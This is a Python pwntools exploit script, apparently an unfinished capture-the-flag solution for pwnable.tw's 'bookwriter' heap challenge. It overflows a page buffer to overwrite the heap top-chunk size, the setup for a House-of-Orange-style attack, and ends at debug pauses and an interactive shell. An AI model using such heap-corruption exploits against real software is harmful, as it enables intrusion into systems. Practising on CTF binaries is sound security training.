#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./bookwriter"
libc_address=0
heap_address=0
#libc=ELF("./bc.so.6")
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("work",4444)
    #conn=remote("chall.pwnable.tw",10304)
    pid=0

def debug():
    log.debug("libc address 0x%x"%libc_address)
    log.debug("heap address :0x%x"%heap_address)
    log.debug("process pid:%d"%pid)
    pause()

def login(name):
    conn.sendafter("Author :",name)

def add(size,content):
    conn.sendlineafter("Your choice :","1")
    conn.sendlineafter("Size of page :",str(size))
    conn.sendafter("Content :",content)

def inform(change,name=None):
    conn.sendlineafter("Your choice :","4")
    ret=conn.recvline(keepends=False)[len("Author : "):]
    if change == True:
        conn.sendlineafter("Do you want to change the author ? (yes:1 / no:0) ","1")
        login(name)
    else:
        conn.sendlineafter("Do you want to change the author ? (yes:1 / no:0) ","0")
    return ret

def show(index):
    conn.sendlineafter("Your choice :","2")
    conn.sendlineafter("Index of page :",str(index))
    conn.recvlines(2)
    ret=conn.recvuntil("\n----------------------",drop=True)
    return ret

def edit(index,name):
    conn.sendlineafter("Your choice :","3")
    conn.sendlineafter("Index of page :",str(index))
    conn.sendafter("Content:",name)

login("a"*0x40)
# No.0
add(0xc08,"a")
edit(0,0xc08*"a")
edit(0,0xc08*"a"+p64(0x103f1)[:3])
# No.1
add(0x10808,"a")
edit(0,"a"*0xc08+p64(0x20900)[:3])
f={
    0x500:p64(0x20900),
}
edit(1,fit(f,filler="a"))
add(0x17008,"a") # 2
add(0x8008,"a") # 3
debug()
add(0x2008,"a") # 4
edit(4,"a"*0x2008)
debug()
edit(4,"a"*0x2008)
debug()
conn.interactive()
